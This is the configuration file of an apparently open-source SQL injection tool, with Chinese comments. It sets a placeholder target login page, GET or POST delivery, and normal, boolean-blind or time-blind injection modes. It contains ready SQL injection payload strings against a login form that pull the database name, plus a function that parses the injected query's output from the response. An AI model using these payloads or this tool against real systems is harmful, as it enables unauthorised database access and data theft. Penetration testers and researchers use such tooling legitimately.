#!/usr/bin/env python
# -*- coding:utf-8 -*-
import requests
from bs4 import BeautifulSoup
from lib.log import logger
__author__ = "LoRexxar"


def UnpackFunction(r):
    index = r.find('<td>')
    index2 = r[index + 4:].find('</td>')
    return r[index + 4:][:index2]


class BaseConfig:
    def __init__(self):
        self.version = "V0.6.1"

        # 目标url
        self.url = 'http://xxxxxx/user/logCheck.php'
        self.s = requests.Session()

        # database可以自定义，默认为空，若为空会调用get_database(),这里是一个列表，必须按照列表格式
        # self.databases_name = ['test', 'test2']
        self.databases_name = []

        # 传参方式 0为GET 1为POST
        SqliRequest = (
            "GET",
            "POST"
        )
        self.SqliRequest = SqliRequest[0]

        # 当传参方式为GET
        # payload传入为键值对方式
        # example: username=ddog123' && select database() && '1'='1&passwd=ddog123&submit=Log+In
        self.payload = "username=ddog123' && select database() && '1'='1&passwd=ddog123&submit=Log+In"

        # 当传参方式为POST
        # payload传入方式为字典
        # example: payload = {"username": "ddog' or select database()%23", "password": "a"}
        # self.payload = {"username": "ddog' or select database()%23", "password": "a"}

        # 注入方式 0为正常 1为盲注 2为时间盲注
        SqliMethod = (
            "normal",
            "build",
            "time"
        )
        self.SqliMethod = SqliMethod[0]

        # 若注入方式为normal，你需要自定义解包函数, 提供两种方式，一种为find, 一种为bs4
        # 需要注意的是，这里输入为r.text.encode('utf-8'), return必须为查询返回值，不能多标签符号等
        # def UnpackFunction(self, r):
        #     index = r.find('<td>')
        #     index2 = r[index + 4:].find('</td>')
        #     return r[index + 4:][:index2]

        # 若注入方式为build盲注，则通过返回长度判断
        # 永真条件的长度（盲注时需要使用）test类中test可跑，默认为0，可设置
        self.len = 0

        # 若注入方式为time，你需要设置延时，建议根据自己的网络环境选择，如果网络环境较差，建议还是大一点儿
        # 建议2-5，现在版本还是单线程，所以时间盲注会非常慢非常慢...
        self.time = 2

